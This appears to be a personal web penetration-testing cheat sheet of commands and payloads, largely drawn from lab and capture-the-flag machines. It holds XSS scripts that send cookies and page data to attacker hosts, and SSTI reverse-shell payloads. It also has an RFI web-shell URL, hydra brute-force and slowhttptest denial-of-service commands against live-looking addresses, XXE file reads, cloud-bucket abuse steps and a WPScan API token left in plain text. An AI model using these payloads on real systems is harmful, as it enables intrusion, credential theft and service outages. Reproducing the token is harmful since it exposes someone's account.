--------------------------------------------------sub domain enumeration-----------------------------------------------------------------
1. amass enum --passive -d
2. "/usr/bin/massdns -r /root/massdns/lists/resolvers.txt -t A -o S subdomains.txt -w livehosts.txt"
3. sed 's/A.*//' livehosts.txt | sed 's/CN.*//' | sed 's/\..$//' | sort -u > live_subdomains.txt


subfinder -d http://tesla.com -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | xargs -I% -P10 sh -c 'hakrawler -plain -linkfinder -depth 5 -url %' | grep "tesla"

site:.cbs.com -site:www.cbs.com

----------------------------------------------------------Real IP enumeration--------------------------------------------------------------
1.python3 cloudfail.py  --target redconet.com
2.https://www.grc.com/fingerprints.htm

---------------------------------------------------------finding links from java scripts from urls from subdomains--------------------------------
pipx install httpx
go get github.com/003random/getJS

echo "www.tempo-team.com" | httpx | getJS -complete | linkJS -m links

echo "domain.com" | haktrails subdomains | httpx -silent | getJS --complete | tojson | anew JS1 


cat file.js | grep -aoP "(?<=(\"|\'|\`))\/[a-zA-Z0-9_?&=\/\-\#\.]*(?=(\"|\'|\`))" | sort -u

echo "spruce.co" | gau | getJS --complete | grep -aoP "(?<=(\"|\'|\`))\/[a-zA-Z0-9_?&=\/\-\#\.]*(?=(\"|\'|\`))" | sort -u
-----------------------------------------------------------jsfiles from wayback urls-----------------------------------------
go get github.com/tomnomnom/waybackurls
waybackurls target.com | grep "\\.js" | xargs -n1 -I@ curl -k @ | tee -a content.txt

-----------------------------------------------------------apk-----------------------------------
Files to check for:
	res/values/strings.xml
	all .db and .sqlite files

apktool d apkfile.apk

d2j-dex2jar -f -o output_jar.jar apk_to_decompile.apk

jd-gui/jadx-gui (https://github.com/skylot/jadx)


-----------------------------------------Burpsuite Memory-------------------------------------
Add the below code in .zshrc or .bashrc:
# java memory
export _JAVA_OPTIONS="-Xmx8g"

-----------------------------------visual inspection of web apps------------------------------------------------------

cat urls.txt | aquatone

eyewitness

httpx -ss

--------------------------------------------------nitko--------------------------------
nikto -url http://10.11.1.71/ -maxtime=200s
nikto -C all -host https://<IP>:<PORT>

------------------------------------------Cookie flags----------------------------------
Secure

Host only

Samesite

----------------------------------------XSS-CSRF--------------------------------------
//apni.js
var url="http://mail.stacked.htb/"  //targeturl(internal wep application)
var xhr=new XMLHttpRequest(); 
xhr.open("GET", url, false); 
xhr.send();
var resp=xhr.responseText;
//transferring HTTP response to us
var xhr2=new XMLHttpRequest(); 
xhr2.open("POST", 'http://10.10.14.89:443/', false);
xhr2.send(resp);


<script src="http://10.10.14.89/apni.js"></script>

--------------------------------------XSS-exfiltrate------------------------------------
<script>var i=new Image(); i.src="http://192.168.119.156/get.php?lol="+document.cookie;</script>

var xhr=new XMLHttpRequest(); 
xhr.open("GET", "http://attacker.com:8000/?"+document.cookie, true); 
xhr.send();

<script>
alert(document.cookie);
var i=new Image;
i.src="http://192.168.119.156/?"+document.cookie;
</script>

<img src="http://10.10.14.89:80/message"></img>

------------------------------------------DOM xss(cannot be detected in web server logs, as payload gets executed directly in browser)------------------
http://xss1.webapp.site/getLuckyNumber.php?name=<img src='lol' onerror="alert(1)">

Beef XSS:
hooking web browsers


green</span><img src=x onerror=alert(document.domain)>

javascript:alert(JSON.stringify(localStorage))
------------------------------------------------sqlmap-------------------------------------
--flush-session

sqlmap -r sql.req --level 5 --risk 3 --random-agent -th 10

--batch

--keep-alive

--users 

--search -T <table_name1>,<table_name2> -C <column_name>

--passwords

--proxy="socks5://127.0.0.1:1080"

-p <parameter to test>

--delay=1 # 1sec delay between requests

-----------------------------------------------XXE---------------------------------------------

<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=./1.php"> ]>
<note><to>Tove</to><from>Jani</from><heading>Reminder</heading><body>&xxe;
</body></note>

HTTP methods: PROPATCH, PROPFIND, LOCK may lead to XXE (Possible xxe)

<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]> #declaring DTD
&ext; #calling external entity

----------------------------------------------Content-discovery---------------------------------------
Gobuster:

gobuster dir -u 'http://172.16.64.91/' -w /mnt/hgfs/D/wordlists/directory-list-2.3-medium_without_percent.txt

gobuster dir -u https://10.10.10.216/ -w /mnt/Ethical_Hacking/wordlists/directory-list-2.3-medium_without_percent.txt -o gobuster_webserver.out -k (TLS)

dirb http://172.16.64.140/project/backup/ -u admin:admin (http basic authentication)

gobuster dir -u 'https://10.10.10.60/' -w /mnt/Ethical_Hacking/wordlists/directory-list-2.3-medium_without_percent.txt -t 80 -x txt,php -k (File extensions)

gobuster vhost -u 'http://schooled.htb' -w  '/mnt/Ethical_Hacking/wordlists/vhosts_all.list.txt' -t 200 --timeout 20s


ffuf:

ffuf -u https://codingo.io/FUZZ -w ./wordlist -recursion -e .bak,.php,.aspx,.txt -c

Vhost:
ffuf -w /path/to/vhost/wordlist -u https://target -H "Host: FUZZ" -fs 4242
ffuf -w ./test.txt -u http://shibboleth.htb/ -H "Host: FUZZ.shibboleth.htb" -fl 10 #lines
ffuf -w ./test.txt -u http://shibboleth.htb/ -H "Host: FUZZ.shibboleth.htb" -fw 18 #words

Recursion:
ffuf -u https://codingo.io/FUZZ -w ./wordlist -recursion -recursion-depth 2 -c 

Multiple FUZZ points:
ffuf -u https://FUZZDOMAIN/FUZZDIR -w ./domains.txt:FUZZDOMAIN,./wordlist.txt:FUZZDIR -c 

Match responses for only specific response codes:
ffuf -u http://10.10.10.232/FUZZ -w /mnt/Ethical_Hacking/wordlists/directory-list-2.3-medium_without_percent.txt -e .txt,.php -t 80 -recursion -recursion-depth 2 -mc 200,204,301,302,307,401,405

Automatic callibrate:
ffuf -u http://10.10.10.81/FUZZ -w /mnt/Ethical_Hacking/wordlists/directory-list-2.3-medium_without_percent.txt -e .aspx,.php -t 80  -ac  

Color, output format HTML:
ffuf -u http://10.11.1.123/FUZZ -w /mnt/Ethical_Hacking/wordlists/directory-list-2.3-medium_without_percent.txt -t 200 -e .php,.txt -ac -c -of html -o ffuf_80.html

Pivoting via socks proxy:
ffuf -u http://10.1.1.95/FUZZ -w /mnt/Ethical_Hacking/wordlists/big.txt -t 100 -c  -ac -e .php,.txt,.html -recursion -recursion-depth 1  -of html -o ffuf_80.html -x socks5://127.0.0.1:1080

Vhosts:
1.finding response size- 
curl -s -H "Host: notexsistent.bolt.htb" http://bolt.htb | wc -c
2.filtering out responses with response size-
ffuf -c -w /mnt/Ethical_Hacking/wordlists/vhosts_all.list.txt -ac -t 200 -u http://bolt.htb -H "Host: FUZZ.bolt.htb" -fs 30347
ffuf -c -w /mnt/Ethical_Hacking/wordlists/vhosts_all.list.txt -ac -t 200 -u http://bolt.htb -H "Host: FUZZ.bolt.htb" -fs 30347 -of html -o ffuf_vhost_80.html

Curl:
curl -vvv 10.10.10.81 


dirsearch:
dirsearch -u http://tcbooking2.centennialcollege.ca/

--max-time=SECONDS  Maximal runtime for the scan

--max-time=


Wordlist Generation:
cewl -w cewl_wordlist.txt -m 5 http://forum.bart.htb/ -d 2

Parameter discovery:
arjun -i php_urls.txt -t 200 -oT GET_params.out -oB 127.0.0.1:8080
arjun -i php_urls.txt -t 200 -oT POST_params.out -oB 127.0.0.1:8080 -m POST

-------------------------------------------------------php-code-injection----------------------------
system('cat /etc/passwd');
phpinfo();

--------------------------------------------------SSTI_paylods-------------------------------

rev_shell 1:
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c  'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.176\",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\");'").read().zfill(417)}}{%endif%}{% endfor %}

rev_shell 2:
{% include request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("bash -c \"bash -l > /dev/tcp/10\x2e10\x2e14\x2e6/443 0<&1 2>&1\"")["read"]() %}

RCE:
{%25+include+request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("ping+-c+5+10\x2e10\x2e14\x2e6")["read"]()+%25}

-----------------------------------------------------Eyewitness-------------------------------------
./EyeWitness.py -f /mnt/Ethical_Hacking/hackthebox/Machines/Tally/200_responses.out


-------------------------------------------------------CMS-----------------------------------------------

Wordpress:

xmlrpc.php-payload:
<methodCall>
	<methodName>system.listMethods</methodName>
	<params></params>
</methodCall>

nmap -p80 --script http-wordpress-brute --script-args 'userdb=users.txt,passdb=passwords.txt' example.com

wpscan -v --url http://10.11.1.251/wp/ --api-token G6LsP7PFCBEaUqLaaVGg7k9jMfXoCBO8uJuEKtmmqsw -e -t 200 -v | tee wpscan_enum.out

wpscan -v --url https://brainfuck.htb/ --api-token G6LsP7PFCBEaUqLaaVGg7k9jMfXoCBO8uJuEKtmmqsw --disable-tls-checks

wpscan -v --url http://10.10.10.88/webservices/wp/ --api-token G6LsP7PFCBEaUqLaaVGg7k9jMfXoCBO8uJuEKtmmqsw --plugins-detection aggressive

wpscan -v --url http://forum.bart.htb/ --api-token G6LsP7PFCBEaUqLaaVGg7k9jMfXoCBO8uJuEKtmmqsw --wp-content-dir 'http://forum.bart.htb/wp-content/' -e

--exclude-content-base
--disable-tls-checks
--wp-content-dir <path>
--wp-plugins-dir <path>

Aggressive(-e ap,at,tt,cb,dbe,u,m --plugins-detection aggressive --plugins-version-detection aggressive -t 200 -v --disable-tls-checks)

Drupal:
droopescan

Endpoints:
/wp-admin/setup-config.php
/wp-config.php.save

------------------------------------------------403bypass--------------------------------------
https://github.com/sting8k/BurpSuite_403Bypasser.git

----------------------------------------------------Creating jwt tokens--------------------------------------
echo -n '{"alg":"HS256","typ":"JWT"}' | base64   (Header)

-----------------------------------------------------find Real IP/cloudflare bypass-------------------------------
ssl.cert.subject.CN:"*target.com" (Shodan)

http://www.crimeflare.org:82/cfs.html

host target.com

search ssl fingerprint in cencys.io

https://github.com/vincentcox/bypass-firewalls-by-DNS-history.git

https://github.com/m0rtem/CloudFail.git

-----------------------------------------------------Bruteforce------------------------------------------
HTTP:
hydra -l admin -P /mnt/Ethical_Hacking/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password\!" -V -t 30

hydra -l 'root@localhost' -P ../final_wordlist.txt 10.11.1.39 http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=420&User=^USER^&Password=^PASS^:Login failed! Your user name or password was entered incorrectly." -V -t 30

HTTP Basic Auth:
hydra -l admin -P /mnt/Ethical_Hacking/wordlists/rockyou.txt -s 7443 -f 10.2.2.31 http-get /admin -V -t 64


---------------------------------------------------------------------generate wordlist from web page-----------------------------------
-a -> metadata
-m -> minimum lenght of word
-d -> depth

cewl -w wordlist.txt -d 10 -a -m 5 http://10.10.10.188/author.html

cewl -w wordlist.txt -d 10 -a -m 8 --with-


------------------------------------------------------aws--------------------------------------------------
1.(list)>
$ aws s3 ls s3://bucket --no-sign-request --region us-west-2

2.write(upload) > 
$ aws s3 cp filename.txt s3://bucket 

3. Try to download uploaded files > 
$ aws s3 cp s3://bucket/file filename

4. Try to move uploaded files >
$ aws s3 mv filename.txt s3://bucket

5.Try to remove uploaded files > 
$ aws s3 rm s3://bucket/filename

make-bucket:
aws s3 mb --endpoint-url=http://s3-testing.stacked.htb/ s3://apni-bucket

http://<bucket-name>.s3.amazonaws.com/ example http://flaws.cloud.s3.amazonaws.com/


Listing permissions:
aws s3api get-bucket-acl --bucket <bucket-name> --profile terraform

Configuring new profile:
aws configure --profile flaws

Listing all s3 buckets associated with a profile:
aws --profile <profile_name> s3 ls

We can enumerate names of s3 buckets as they are unique. So we can determine if s3 bucket with same name exists as we would not be able to create it.


Publically accessible ec2 snapshots:

Finding account id and account name from profile:
aws --profile flaws sts get-caller-identity

Getting info of a user:
aws --profile flaws_lvl6 iam get-user

Finding snapshot_id:
aws --profile flaws  ec2 describe-snapshots --owner-id 975426262029 --region us-west-2

Creating volume from ec2 snapshot:
aws --profile terraform ec2 create-volume --region us-west-2  --snapshot-id  snap-0b49342abd1bdcb89 --availability-zone us-west-2b

Getting attached user policies:
aws --profile flaws_lvl6 iam list-attached-user-policies --user-name Level6

Getting version id of policy:
aws --profile flaws_lvl6 iam get-policy  --policy-arn arn:aws:iam::975426262029:policy/list_apigateways

Getting Policy version:
aws --profile flaws_lvl6 iam get-policy-version  --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --version-id v4


- aws s3 ls s3://
- aws s3api list-buckets
- aws s3 ls s3 :// bucket .com
- aws s3 ls --recursive s3 :// bucket .com
- aws s3 sync s3:// bucketname s3-files-dir
- aws s3 cp s3 :// bucket-name/ <file> <destination>
- aws s3 cp/mv test-file.txt s3 :// bucket-name
- aws s3 rm s3 :// bucket-name/test-file.txt
- aws s3api get-bucket-acl --bucket bucket-name # Check owner
- aws s3api head-object --bucket bucket-name --key file.txt # Check file metadata

docker run -it -v ~/.aws:/root/.aws rhinosecuritylabs/pacu:latest

-------------------------------------------------------------------------LFI/RFI---------------------------------------
http://lfi.webapp.site/index.php?a=http://10.100.13.200:80/php_GET_param_web_shell_ine.txt&cmd=whoami


---------------------------------------------------------------check security headers-------------------------------------------
https://github.com/santoru/shcheck.git 

Security headers-
HTTP Strict Transport Security (HSTS)

X-Frame-Options (clickjacking)

X-XXS-Protection (inbuilt xss protection)

Content-Security-Policy (prevents loading scripts)

Same-Site Cookie (Can prevent csrf)

Access-Control-Allow-Origin

------------------------------------------------------------node.js------------------------------------------------
package.json file contains all dependencies


--------------------------------------------------------------WEBDAV--------------------------------------------------
davtest -url http://10.10.10.15/


------------------------------------------------------------SSRF---------------------------------------
<subdomain>.localtest.me  (resolves to 127.0.0.1)

python3 ssrfmap.py -r data/req.txt -p path -m portscan | tee portscan.out | grep open

------------------------------------------------------npm-http-server--------------------------------------
http-server -p 8080


---------------------------------------------------php http-server------------------------------------
php -S 127.0.0.1:8080


------------------------------------------------white spaces alternatives-----------------------------
(‘%09’, ‘%0A’, ‘%0C’, ‘%0D’, ‘%0B’ ‘%a0’)



---------------------------------------------------Regex--------------------------------------------
4dc3ce7e-a2c3-4fb5-89ac-d5654c96c9e9:
[\w]{8}-[\w]{4}-[\w]{4}-[\w]{4}-[\w]{12}


---------------------------------------------------Reverse-Proxy-----------------------------------
Nginx->Apache
http://10.10.10.249/admin../server-status

Apache->Apache-Tomcat
http://10.10.11.138/portal/..;/manager/

http://10.10.11.138/;name=lollz/manager/

------------------------------------------------------DOS------------------------------------------
slowhttptest -c 10000 -i 10 -r 2000 -u http://demo.com:80 -x 24 -p 3
slowhttptest -c 10000 -X -r 1000 -w 10 -y 20 -n 5 -z 32 -u http://dedadada.com:80 -p 5 -l 350
slowhttptest -c 10000 -B -i 110 -r 2000 -s 8192 -t POST -u http://169.45.223.198:80 -x 10 -p 3

------------------------------------------------------Sessions--------------------------------------------


---------------------------------------------------cookie flags---------------------------------------
Domain
For example, if you set Domain=mozilla.org, cookies are available on subdomains like developer.mozilla.org

Session
Session cookies are deleted when the current session ends. The browser defines when the "current session" ends, and some browsers use session restoring when restarting. This can cause session cookies to last indefinitely.

Permanent cookies are deleted at a date specified by the Expires attribute, or after a period of time specified by the Max-Age attribute.

session fixation- attacker is able to reuse same cookie/Cookie is unique for user/same cookie is generated each time for that user.



------------------------------------mobsf--------------------------------
docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest